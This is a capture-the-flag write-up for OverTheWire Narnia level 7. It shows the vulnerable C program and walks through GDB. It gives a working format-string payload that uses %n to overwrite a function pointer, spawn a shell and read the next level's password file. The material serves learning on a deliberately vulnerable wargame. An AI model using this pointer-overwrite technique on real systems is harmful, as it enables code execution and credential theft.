# Narnia OverTheWire Level 7-8

## Problem Explanation and Background Knowledge

-The binary has a function called vuln() that contains a format string vulnerability

-User inputoasses directly as an argument to snprintf() without sanitization

-It also has a function pointer (ptrf) on the stack that points to a function (goodfrunction).

-We need to overwrite that pointer to point to hackedfunction() instead,which calls system("/bin/sh") and gives the permissions

-We can use the %n format specifier that writes the number of character printed in a memory address so we can contreol what value gets written into ptrf

### Source code 

    #include <stdio.h>
    #include <stdlib.h>
    #include <string.h>
    #include <stdlib.h>
    #include <unistd.h>

    int goodfunction();
    int hackedfunction();

    int vuln(const char *format){
            char buffer[128];
            int (*ptrf)();

            memset(buffer, 0, sizeof(buffer));
            printf("goodfunction() = %p\n", goodfunction);
            printf("hackedfunction() = %p\n\n", hackedfunction);

            ptrf = goodfunction;
            printf("before : ptrf() = %p (%p)\n", ptrf, &ptrf);

            printf("I guess you want to come to the hackedfunction...\n");
            sleep(2);
            ptrf = goodfunction;

            snprintf(buffer, sizeof buffer, format);

            return ptrf();
    }

    int main(int argc, char **argv){
            if (argc <= 1){
                    fprintf(stderr, "Usage: %s <buffer>\n", argv[0]);
                    exit(-1);
            }
            exit(vuln(argv[1]));
    }

    int goodfunction(){
            printf("Welcome to the goodfunction, but i said the Hackedfunction..\n");
            fflush(stdout);

            return 0;
    }

    int hackedfunction(){
            printf("Way to go!!!!");
	        fflush(stdout);
            setreuid(geteuid(),geteuid());
            system("/bin/sh");

            return 0;
    }


## Solution Process


-We run the binary with any input

-It gives us the address of prrf
    
    before: ptrf() = 0x80492ea (0xffffda28)

-0xffffda28 is where ptrf lives in memory

-Then we loaded the binary in GDB 

    gdb ./narnia7

-We disassemble vuln() to find snprintf which is called at offset +146 and ptrf gets loaded right after offset +154,so we set a breakpoint there

    (gdb) disassemble vuln
    (gdb) break *vuln+154

-Now we ran something like "AAAA" to confirm that "AAAA" landed in the buffer verifying the stack layout
    
    run "AAAA"

-Now we convert the address of hackedfunction (0x804930f) which gives 134517519,the number of characters we need to print ,and then its taken as hex again thanks to %x when %n writes into ptrf

### Design the payload

-We get now the payload

    ./narnia7 $(perl -e 'print "\x28\xda\xff\xff"')%134517519x%n

-\x28\xda\xff\xff is the address of ptrf in little endian ,obviously the one that stands out out gdb

-%134517519-prints that many characters

-%n writes the count into the target address

-and now we got the shell,we can look for the password in the known directory
    
    I guess you want to come to the hackedfunction...
    Way to go!!!!$ whoami
    narnia8
    $ cat /etc/narnia_pass/narnia8



## key Concepts Learned 


-Format String Vulnerability happens when user inout is passed directly as the format string allowing memory reads with %x and memory writes with %n 
